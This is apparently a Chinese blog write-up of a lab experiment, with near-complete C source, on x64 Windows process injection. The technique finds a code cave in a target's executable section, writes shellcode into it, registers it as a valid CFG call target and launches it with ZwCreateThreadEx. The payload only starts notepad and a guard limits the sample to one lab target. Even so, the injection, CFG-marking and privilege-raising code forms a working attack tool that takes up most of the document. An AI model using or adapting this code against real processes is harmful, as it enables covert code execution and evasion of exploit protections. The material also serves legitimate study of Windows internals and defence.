code cave 注入小记：ZwCreateThreadEx、CFG 和 Session 0

前阵子做了一个挺有意思的小实验：不走常见的 VirtualAllocEx 申请远程内存，而是在目标进程已有模块里找一段 code cave，把一小段 x64 payload 写进去，然后用 ZwCreateThreadEx 把线程拉起来。payload 本身没做复杂事情，只是跑了一句：

WinExec("notepad.exe", SW_SHOW);

真正折腾人的地方不在 notepad，而在几个细节：怎么找洞，远程函数地址怎么算，x64 调用约定怎么处理，目标开了 CFG 为什么会崩，以及 Session 0 下为什么“没看到窗口”不等于“没执行”。

这篇就按我自己的调试过程记一下。

为什么想用 code cave

远程线程注入最经典的写法大家都熟：

VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread

这条链路很直接，成功率也高。申请一块远程内存，写 shellcode 或 DLL 路径，再创建线程。入门时用它很舒服。

但这次想换个玩法：不额外申请新内存，而是利用目标模块里已经存在的可执行区域。很多 PE 文件的可执行节里会有一些填充空间，比如连续的 0x00 或 0xCC。如果空间够大，就可以把 payload 塞进去。这种地方一般叫 code cave。

它的好处是思路更贴近 PE 本身。你得去读目标模块的 DOS 头、NT 头、节表，判断哪个节有执行权限，再在节内容里找连续空洞。相比直接申请内存，这个过程更麻烦，但也更适合拿来练 Windows 二进制基础。

当然，code cave 不是万能的。目标模块里不一定有足够长的洞，payload 稍微大一点就可能放不下。写入模块映像页也要小心，不能破坏原本会被执行到的代码区域。所以我这里的 payload 尽量写得很短，只启动 notepad，用来验证执行链路。

大体流程

整个程序的流程大概是这样：

  1. 找到目标进程，拿到 PID。
  2. 打开目标进程，权限包含读写内存、改页面属性、创建线程。
  3. 枚举目标模块，拿到主模块基址。
  4. 读取远程 PE 头和节表。
  5. 在可执行节里找连续 0x00 或 0xCC。
  6. 计算目标进程里的 WinExec 地址。
  7. 构造 payload，写入 code cave。
  8. 处理 CFG，把入口标记成合法 call target。
  9. 用 ZwCreateThreadEx 从 code cave 创建远程线程。

这里每一步单独看都不难，容易出问题的是组合起来后的边界条件。比如 payload 能写进去，但 CFG 不认这个入口；线程创建成功了，但 notepad 在 Session 0 里，看不到窗口；本地 WinExec 地址拿到了，但远程模块基址不一样，直接写进去就是错的。

找 code cave

找洞之前，先得确定扫描范围。我没有扫整个进程地址空间，只扫目标主模块的可执行节。理由很简单：这次目标就是在已有代码区域里落点，范围收窄以后更可控。

PE 解析流程是常规的：读 IMAGE_DOS_HEADER，检查 MZ；根据 e_lfanew 找 NT 头，检查 PE\0\0；然后读 IMAGE_FILE_HEADER 和 IMAGE_OPTIONAL_HEADER64；最后根据 NumberOfSections 遍历节表。遍历时只看带 IMAGE_SCN_MEM_EXECUTE 的节，其他节直接跳过。

真正搜索时，就是找连续的 0x00 或 0xCC。这两类字节很常见，前者多半是对齐或填充，后者经常是调试填充。

不过这里有个细节：我没有直接返回连续空洞的第一个字节，而是在空洞内部找了一个 16 字节对齐的位置。原因和后面的 CFG 有关。CFG 的 call target 有粒度要求，入口地址对齐后，SetProcessValidCallTargets 更稳。

所以搜索逻辑差不多是：连续计数达到 payload 大小以后，把起点向上对齐到 16 字节，再检查从对齐后的地址开始是否还能放下 payload。如果能放下，就用这个地址作为线程入口。

远程 WinExec 地址

payload 要调用 WinExec，但不能把本进程里的 WinExec 地址直接写到远程进程里。ASLR 存在时，本地 kernel32.dll 或 kernelbase.dll 的基址，不一定等于目标进程里的基址。

比较稳的方式是用 RVA 算：

remote_func = remote_module_base + (local_func - local_module_base)

也就是先在本进程里 GetProcAddress，拿到本地函数地址。然后用 GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, ...) 反查这个地址实际属于哪个模块。这个步骤挺重要，因为现代 Windows 上不少 API 可能转发到 kernelbase.dll。

拿到本地模块名以后，再去目标进程模块列表里找同名模块，取远程模块基址。最后把本地函数 RVA 加到远程模块基址上，就得到远程 WinExec 地址。

这个方法不花哨，但比硬编码地址靠谱。

Payload 写法

payload 很短，核心就是调用：

WinExec("notepad.exe", SW_SHOW);

x64 Windows 调用约定里，前几个参数走寄存器：

RCX, RDX, R8, R9

所以这段 payload 做的事情就是：RCX 放 "notepad.exe" 字符串地址，EDX 放 SW_SHOW，RAX 放远程 WinExec 地址，然后 call rax。

字符串我直接放在 payload 后面，然后用 RIP-relative 寻址去取。这样 payload 不依赖绝对地址，写到哪个 code cave 都能跑。构造时先把 lea rcx, [rip+rel32] 的 rel32 留空，等字符串偏移确定以后再回填。

另外别忘了 x64 的 shadow space 和栈对齐。payload 入口先 sub rsp, 28h，调用结束后 add rsp, 28h，最后 ret。这点很容易被忽略，但系统 API 内部如果依赖栈对齐，写错了就会出现很奇怪的崩溃。

写入和恢复权限

找到 code cave 以后，写入流程是：

VirtualProtectEx(..., PAGE_EXECUTE_READWRITE, ...);
WriteProcessMemory(...);
FlushInstructionCache(...);
VirtualProtectEx(..., old_protect, ...);

这里我保留了两个习惯。

第一，写完后刷 FlushInstructionCache。很多小 demo 不刷也能跑，但既然是在远程进程写可执行代码，刷一下更稳。

第二，写完恢复原页面权限。实验里不恢复通常也能看到结果，但恢复后状态更干净，调试时变量也少一点。

CFG 这个坑

一开始最容易出现的现象是：payload 写进去了，线程也创建了，目标却崩了。

如果目标开了 CFG，原因大概率是线程入口不合法。这里要分清两个概念：页面有执行权限，不代表这个地址就是 CFG 认可的间接调用目标。

也就是说，code cave 位于可执行节里，CPU 层面可以取指，但 CFG 还是可能拦住它，因为这个入口不在合法 call target 集合里。

解决办法是调用：

SetProcessValidCallTargets(
    process,
    page_base,
    page_size,
    1,
    &info
);

几个参数很容易传错：page_base 要是页对齐地址，page_size 用系统页大小，info.Offset 是 code cave 入口相对页基址的偏移，info.Flags 是 CFG_CALL_TARGET_VALID。

这里也解释了前面为什么要选 16 字节对齐的 code cave 入口。没对齐时，标记可能失败，或者标记的目标不是你真正想跳的位置。

这一步加上以后，整个链路稳定很多。它不是关闭 CFG，而是按系统提供的方式把这个入口登记成合法目标。

ZwCreateThreadEx 和 Session 0

这次用 ZwCreateThreadEx，不是为了“更酷”而换 API。它在这个实验里的重点，是把执行点放进目标进程自己的上下文里。

如果目标进程在 Session 0，而注入器在当前用户 Session，那么从注入器直接启动 notepad，和在目标进程里开线程启动 notepad，是两回事。前者属于注入器上下文，后者属于目标进程上下文。

ZwCreateThreadEx 创建的是目标进程里的线程。线程运行在哪个进程里，就自然跟着那个进程的 Session、令牌和桌面环境走。所以说它在这里是为了处理会话隔离：不是让 Session 0 的 UI 穿透到当前桌面，而是让 payload 真正运行在目标进程所属的会话里。

调用形式大概是：

zw_create_thread_ex(
    &thread,
    THREAD_ALL_ACCESS,
    NULL,
    process,
    remote_cave,
    NULL,
    0,
    0,
    0,
    0,
    NULL
);

最关键的参数就是 remote_cave。前面找洞、写 payload、标记 CFG，都是为了让这个地址能作为远程线程入口稳定执行。

为什么看不到 notepad

这个问题挺常见：程序跑完了，日志也显示线程创建成功，但桌面上没出现 notepad。

如果目标在 Session 0，这并不奇怪。payload 是在目标进程上下文里执行的，WinExec 创建出来的进程也会受这个上下文影响。它可能确实创建了，只是不在当前交互桌面上显示。

所以验证时不要只盯着窗口。更靠谱的是看有没有新的 notepad.exe 进程、它的 Session ID 是多少、目标有没有崩溃、ZwCreateThreadEx 返回的 NTSTATUS 是否成功、CFG 标记有没有成功。

早期我用 MessageBox 做 payload 时，这个问题更明显。Session 0 下弹框基本不适合作为唯一观察信号。换成 notepad 后，至少还能通过进程列表判断执行结果。

调试顺序

这种程序失败时，最好别上来就改 shellcode。我一般按这个顺序看：

  1. 目标进程 PID 是否正确。
  2. Session ID 是否符合预期。
  3. 主模块基址和大小是否正常。
  4. 远程 WinExec 地址是否落在对应模块范围内。
  5. payload 大小是否合理。
  6. code cave 所在节和偏移是否合理。
  7. WriteProcessMemory 写入长度是否完整。
  8. SetProcessValidCallTargets 是否成功。
  9. ZwCreateThreadEx 返回值是否成功。
  10. notepad 是否创建，Session ID 是否符合预期。

按这个顺序查，基本能把问题分层。最怕的是只看到“没弹窗口”，然后开始乱改 payload。其实问题可能在 CFG，也可能在会话，也可能只是远程 API 地址算错。

小结

这次实验表面上只是启动一个 notepad，真正有意思的是背后的组合：用 PE 节表找 code cave，而不是申请新内存；payload 使用 RIP-relative 寻址，尽量保持位置无关；远程 API 地址按模块 RVA 计算，不硬编码；写入后恢复页面权限，并刷新指令缓存；遇到 CFG 时，用 SetProcessValidCallTargets 正常登记入口；最后用 ZwCreateThreadEx 让 payload 在目标进程上下文里执行，从而适配 Session 0 场景。

这类实验最容易让人卡住的地方，往往不是某个 API 不会用，而是几个 Windows 机制叠在一起以后，现象变得不直观。code cave、CFG、x64 ABI、ASLR、Session 0，每个点单独看都还好，放在一起就很考验耐心。

我觉得它的价值也在这里。最后能不能看到 notepad 其实没那么重要，重要的是知道每一步为什么要这样做，失败时又该往哪一层查。

static void print_last_error(const char *what)
{
    DWORD e = GetLastError();
    printf("[-] %s failed, gle=%lu\n", what, e);
}

static int enable_privilege(LPCWSTR privilege)
{
    HANDLE token = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        print_last_error("OpenProcessToken");
        return 0;
    }

    if (!LookupPrivilegeValueW(NULL, privilege, &luid)) {
        print_last_error("LookupPrivilegeValueW");
        CloseHandle(token);
        return 0;
    }

    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        print_last_error("AdjustTokenPrivileges");
        CloseHandle(token);
        return 0;
    }

    CloseHandle(token);
    return GetLastError() == ERROR_SUCCESS;
}

static DWORD find_process_by_name(LPCWSTR name)
{
    HANDLE snap;
    PROCESSENTRY32W pe;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        print_last_error("CreateToolhelp32Snapshot(process)");
        return 0;
    }

    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                DWORD pid = pe.th32ProcessID;
                CloseHandle(snap);
                return pid;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return 0;
}

static int get_remote_module(DWORD pid, LPCWSTR module_name, REMOTE_MODULE *out)
{
    HANDLE snap;
    MODULEENTRY32W me;
    int want_main = (module_name == NULL || module_name[0] == L'\0');

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap == INVALID_HANDLE_VALUE) {
        print_last_error("CreateToolhelp32Snapshot(module)");
        return 0;
    }

    ZeroMemory(&me, sizeof(me));
    me.dwSize = sizeof(me);

    if (Module32FirstW(snap, &me)) {
        do {
            if (want_main || _wcsicmp(me.szModule, module_name) == 0) {
                out->base = me.modBaseAddr;
                out->size = me.modBaseSize;
                wcsncpy_s(out->name, MAX_PATH, me.szModule, _TRUNCATE);
                CloseHandle(snap);
                return 1;
            }
        } while (Module32NextW(snap, &me));
    }

    CloseHandle(snap);
    return 0;
}

static LPCWSTR basename_w(LPCWSTR path)
{
    LPCWSTR slash1 = wcsrchr(path, L'\\');
    LPCWSTR slash2 = wcsrchr(path, L'/');
    LPCWSTR slash = slash1 > slash2 ? slash1 : slash2;
    return slash ? slash + 1 : path;
}

static ULONGLONG remote_export_address(DWORD pid, LPCWSTR dll_name, LPCSTR proc_name)
{
    HMODULE local_requested;
    FARPROC local_proc;
    HMODULE owner_module = NULL;
    WCHAR owner_path[MAX_PATH];
    LPCWSTR owner_name;
    REMOTE_MODULE remote_owner;

    local_requested = GetModuleHandleW(dll_name);
    if (!local_requested) {
        local_requested = LoadLibraryW(dll_name);
    }
    if (!local_requested) {
        print_last_error("LoadLibraryW(local)");
        return 0;
    }

    local_proc = GetProcAddress(local_requested, proc_name);
    if (!local_proc) {
        print_last_error("GetProcAddress(local)");
        return 0;
    }

    if (!GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                            (LPCWSTR)local_proc,
                            &owner_module)) {
        print_last_error("GetModuleHandleExW(FROM_ADDRESS)");
        return 0;
    }

    if (!GetModuleFileNameW(owner_module, owner_path, MAX_PATH)) {
        print_last_error("GetModuleFileNameW");
        return 0;
    }

    owner_name = basename_w(owner_path);
    if (!get_remote_module(pid, owner_name, &remote_owner)) {
        wprintf(L"[-] remote module %ls was not found\n", owner_name);
        return 0;
    }

    return (ULONGLONG)remote_owner.base + ((BYTE *)local_proc - (BYTE *)owner_module);
}

static int append_byte(BYTE *buf, SIZE_T cap, SIZE_T *n, BYTE v)
{
    if (*n + 1 > cap) return 0;
    buf[(*n)++] = v;
    return 1;
}

static int append_bytes(BYTE *buf, SIZE_T cap, SIZE_T *n, const BYTE *src, SIZE_T len)
{
    if (*n + len > cap) return 0;
    CopyMemory(buf + *n, src, len);
    *n += len;
    return 1;
}

static int append_u32(BYTE *buf, SIZE_T cap, SIZE_T *n, DWORD v)
{
    return append_bytes(buf, cap, n, (const BYTE *)&v, sizeof(v));
}

static int append_u64(BYTE *buf, SIZE_T cap, SIZE_T *n, ULONGLONG v)
{
    return append_bytes(buf, cap, n, (const BYTE *)&v, sizeof(v));
}

static int patch_rel32(BYTE *buf, SIZE_T at, SIZE_T next_ip, SIZE_T target)
{
    int64_t rel = (int64_t)target - (int64_t)next_ip;
    LONG rel32;

    if (rel < INT32_MIN || rel > INT32_MAX) {
        return 0;
    }

    rel32 = (LONG)rel;
    CopyMemory(buf + at, &rel32, sizeof(rel32));
    return 1;
}

static int build_notepad_payload(BYTE *buf, SIZE_T cap, SIZE_T *payload_size,
                                 ULONGLONG win_exec)
{
    SIZE_T n = 0;
    SIZE_T rel_cmd;
    SIZE_T off_cmd;
    const char cmd[] = "notepad.exe";

    append_bytes(buf, cap, &n, (BYTE *)"\x48\x83\xEC\x28", 4);            /* sub rsp, 28h */
    append_bytes(buf, cap, &n, (BYTE *)"\x48\x8D\x0D", 3);                /* lea rcx, cmd */
    rel_cmd = n;
    append_u32(buf, cap, &n, 0);
    append_bytes(buf, cap, &n, (BYTE *)"\xBA", 1);                        /* mov edx, SW_SHOW */
    append_u32(buf, cap, &n, SW_SHOW);
    append_bytes(buf, cap, &n, (BYTE *)"\x48\xB8", 2);                    /* mov rax, WinExec */
    append_u64(buf, cap, &n, win_exec);
    append_bytes(buf, cap, &n, (BYTE *)"\xFF\xD0", 2);                    /* call rax */
    append_bytes(buf, cap, &n, (BYTE *)"\x48\x83\xC4\x28", 4);            /* add rsp, 28h */
    append_byte(buf, cap, &n, 0xC3);                                      /* ret */

    off_cmd = n;
    append_bytes(buf, cap, &n, (const BYTE *)cmd, sizeof(cmd));

    if (n > cap) return 0;
    if (!patch_rel32(buf, rel_cmd, rel_cmd + 4, off_cmd)) return 0;

    *payload_size = n;
    return 1;
}

static int read_remote(HANDLE process, const void *remote, void *local, SIZE_T size)
{
    SIZE_T got = 0;
    return ReadProcessMemory(process, remote, local, size, &got) && got == size;
}

static int executable_section(DWORD characteristics)
{
    return (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
}

static BYTE *find_code_cave_in_section(const BYTE *bytes, SIZE_T len, SIZE_T need)
{
    SIZE_T i;
    SIZE_T run = 0;

    for (i = 0; i < len; ++i) {
        if (bytes[i] == 0x00 || bytes[i] == 0xCC) {
            SIZE_T start;
            SIZE_T aligned;

            ++run;
            start = i + 1 - run;
            aligned = (start + 15u) & ~(SIZE_T)15u;
            if (aligned >= start && aligned + need <= i + 1) {
                return (BYTE *)(bytes + aligned);
            }
        } else {
            run = 0;
        }
    }

    return NULL;
}

static BYTE *find_remote_code_cave(HANDLE process, const REMOTE_MODULE *module, SIZE_T need)
{
    IMAGE_DOS_HEADER dos;
    DWORD nt_sig;
    IMAGE_FILE_HEADER file_header;
    IMAGE_OPTIONAL_HEADER64 optional_header;
    ULONGLONG nth;
    ULONGLONG section_table;
    WORD i;

    if (!read_remote(process, module->base, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] bad remote DOS header\n");
        return NULL;
    }

    nth = (ULONGLONG)module->base + (DWORD)dos.e_lfanew;
    if (!read_remote(process, (void *)nth, &nt_sig, sizeof(nt_sig)) || nt_sig != IMAGE_NT_SIGNATURE) {
        printf("[-] bad remote NT header\n");
        return NULL;
    }

    if (!read_remote(process, (void *)(nth + sizeof(DWORD)), &file_header, sizeof(file_header))) {
        print_last_error("ReadProcessMemory(FILE_HEADER)");
        return NULL;
    }

    if (!read_remote(process,
                     (void *)(nth + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)),
                     &optional_header,
                     sizeof(optional_header))) {
        print_last_error("ReadProcessMemory(OPTIONAL_HEADER64)");
        return NULL;
    }

    if (optional_header.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        printf("[-] this PoC is x64-only; rebuild x64 and target a 64-bit ctfexe.exe\n");
        return NULL;
    }

    section_table = nth + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + file_header.SizeOfOptionalHeader;
    for (i = 0; i < file_header.NumberOfSections; ++i) {
        IMAGE_SECTION_HEADER sh;
        SIZE_T section_size;
        BYTE *local;
        BYTE *cave;

        if (!read_remote(process,
                         (void *)(section_table + (ULONGLONG)i * sizeof(sh)),
                         &sh,
                         sizeof(sh))) {
            continue;
        }

        if (!executable_section(sh.Characteristics)) {
            continue;
        }

        section_size = sh.Misc.VirtualSize ? sh.Misc.VirtualSize : sh.SizeOfRawData;
        if (section_size < need || section_size > MAX_SECTION_BYTES) {
            continue;
        }

        local = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, section_size);
        if (!local) {
            continue;
        }

        if (ReadProcessMemory(process,
                              module->base + sh.VirtualAddress,
                              local,
                              section_size,
                              NULL)) {
            cave = find_code_cave_in_section(local, section_size, need);
            if (cave) {
                BYTE *remote_cave = module->base + sh.VirtualAddress + (cave - local);
                printf("[+] code cave: section %.8s + 0x%Ix -> %p (%Iu bytes needed)\n",
                       sh.Name,
                       (SIZE_T)(cave - local),
                       remote_cave,
                       need);
                HeapFree(GetProcessHeap(), 0, local);
                return remote_cave;
            }
        }

        HeapFree(GetProcessHeap(), 0, local);
    }

    return NULL;
}

static int write_payload_to_cave(HANDLE process, BYTE *remote, const BYTE *payload, SIZE_T payload_size)
{
    DWORD old_protect = 0;
    DWORD tmp = 0;
    SIZE_T written = 0;

    if (!VirtualProtectEx(process, remote, payload_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        print_last_error("VirtualProtectEx(RWX)");
        return 0;
    }

    if (!WriteProcessMemory(process, remote, payload, payload_size, &written) || written != payload_size) {
        print_last_error("WriteProcessMemory(payload)");
        VirtualProtectEx(process, remote, payload_size, old_protect, &old_protect);
        return 0;
    }

    FlushInstructionCache(process, remote, payload_size);
    VirtualProtectEx(process, remote, payload_size, old_protect, &tmp);
    return 1;
}

static int mark_cfg_call_target(HANDLE process, BYTE *remote)
{
    HMODULE kernelbase;
    PFN_SetProcessValidCallTargets set_process_valid_call_targets;
    SYSTEM_INFO si;
    ULONG_PTR page_size;
    ULONG_PTR addr;
    BYTE *page_base;
    CFG_CALL_TARGET_INFO info;
    MEMORY_BASIC_INFORMATION mbi;
    DWORD old_protect = 0;
    DWORD tmp = 0;

    kernelbase = GetModuleHandleW(L"kernelbase.dll");
    if (!kernelbase) {
        kernelbase = GetModuleHandleW(L"kernel32.dll");
    }
    if (!kernelbase) {
        print_last_error("GetModuleHandleW(kernelbase/kernel32)");
        return 0;
    }

    set_process_valid_call_targets =
        (PFN_SetProcessValidCallTargets)GetProcAddress(kernelbase, "SetProcessValidCallTargets");
    if (!set_process_valid_call_targets) {
        printf("
  •  SetProcessValidCallTargets is unavailable; continuing without CFG marking\n");
        return 1;
    }

    if (!VirtualQueryEx(process, remote, &mbi, sizeof(mbi))) {
        print_last_error("VirtualQueryEx(code cave)");
        return 0;
    }

    GetSystemInfo(&si);
    page_size = (ULONG_PTR)si.dwPageSize;
    addr = (ULONG_PTR)remote;
    page_base = (BYTE *)(addr & ~(page_size - 1));

    info.Offset = addr - (ULONG_PTR)page_base;
    info.Flags = CFG_CALL_TARGET_VALID;

    if (!VirtualProtectEx(process, page_base, page_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        print_last_error("VirtualProtectEx(CFG page RWX)");
        return 0;
    }

    if (!set_process_valid_call_targets(process, page_base, page_size, 1, &info)) {
        print_last_error("SetProcessValidCallTargets");
        VirtualProtectEx(process, page_base, page_size, old_protect, &tmp);
        return 0;
    }

    if (!VirtualProtectEx(process, page_base, page_size, old_protect, &tmp)) {
        print_last_error("VirtualProtectEx(restore CFG page)");
        return 0;
    }

    printf("[+] CFG valid call target marked: page %p + 0x%Ix\n", page_base, info.Offset);
    return 1;
}

static int start_remote_thread(HANDLE process, BYTE *start)
{
    HMODULE ntdll;
    PFN_ZwCreateThreadEx zw_create_thread_ex;
    HANDLE thread = NULL;
    NTSTATUS status;

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        print_last_error("GetModuleHandleW(ntdll)");
        return 0;
    }

    zw_create_thread_ex = (PFN_ZwCreateThreadEx)GetProcAddress(ntdll, "ZwCreateThreadEx");
    if (!zw_create_thread_ex) {
        zw_create_thread_ex = (PFN_ZwCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    }
    if (!zw_create_thread_ex) {
        print_last_error("GetProcAddress(ZwCreateThreadEx)");
        return 0;
    }

    status = zw_create_thread_ex(&thread,
                                 THREAD_ALL_ACCESS,
                                 NULL,
                                 process,
                                 start,
                                 NULL,
                                 0,
                                 0,
                                 0,
                                 0,
                                 NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] ZwCreateThreadEx failed, ntstatus=0x%08lX\n", (DWORD)status);
        return 0;
    }

    printf("[+] remote thread started: %p\n", thread);
    CloseHandle(thread);
    return 1;
}

int wmain(int argc, wchar_t **argv)
{
    LPCWSTR target_name = TARGET_NAME;
    DWORD pid;
    DWORD session_id = 0;
    HANDLE process;
    REMOTE_MODULE main_module;
    ULONGLONG win_exec;
    BYTE payload[512];
    SIZE_T payload_size = 0;
    BYTE *remote_cave;
    DWORD access = PROCESS_CREATE_THREAD |
                   PROCESS_QUERY_INFORMATION |
                   PROCESS_VM_OPERATION |
                   PROCESS_VM_READ |
                   PROCESS_VM_WRITE;

    if (argc > 1) {
        target_name = argv[1];
    }

    if (_wcsicmp(target_name, TARGET_NAME) != 0) {
        wprintf(L"[-] lab guard: this sample only targets %ls\n", TARGET_NAME);
        return 1;
    }

    enable_privilege(SE_DEBUG_NAME);

    pid = find_process_by_name(target_name);
    if (!pid) {
        wprintf(L"[-] process %ls not found\n", target_name);
        return 1;
    }
    printf("[+] target pid: %lu\n", pid);

    if (ProcessIdToSessionId(pid, &session_id)) {
        printf("[+] target session: %lu\n", session_id);
    }

    process = OpenProcess(access, FALSE, pid);
    if (!process) {
        print_last_error("OpenProcess");
        return 1;
    }

    if (!get_remote_module(pid, NULL, &main_module)) {
        printf("[-] main module not found\n");
        CloseHandle(process);
        return 1;
    }
    wprintf(L"[+] main module: %ls @ %p, size 0x%lX\n",
            main_module.name,
            main_module.base,
            main_module.size);

    win_exec = remote_export_address(pid, L"kernel32.dll", "WinExec");
    if (!win_exec) {
        CloseHandle(process);
        return 1;
    }
    printf("[+] remote WinExec: 0x%llX\n", win_exec);

    if (!build_notepad_payload(payload, sizeof(payload), &payload_size, win_exec)) {
        printf("[-] payload build failed\n");
        CloseHandle(process);
        return 1;
    }
    printf("[+] payload size: %Iu bytes\n", payload_size);

    remote_cave = find_remote_code_cave(process, &main_module, payload_size);
    if (!remote_cave) {
        printf("[-] no executable 00/CC code cave large enough in the target main module\n");
        CloseHandle(process);
        return 1;
    }

    if (!write_payload_to_cave(process, remote_cave, payload, payload_size)) {
        CloseHandle(process);
        return 1;
    }
    printf("[+] payload written to code cave\n");

    if (!mark_cfg_call_target(process, remote_cave)) {
        CloseHandle(process);
        return 1;
    }

    if (!start_remote_thread(process, remote_cave)) {
        CloseHandle(process);
        return 1;
    }

    CloseHandle(process);
    return 0;
}
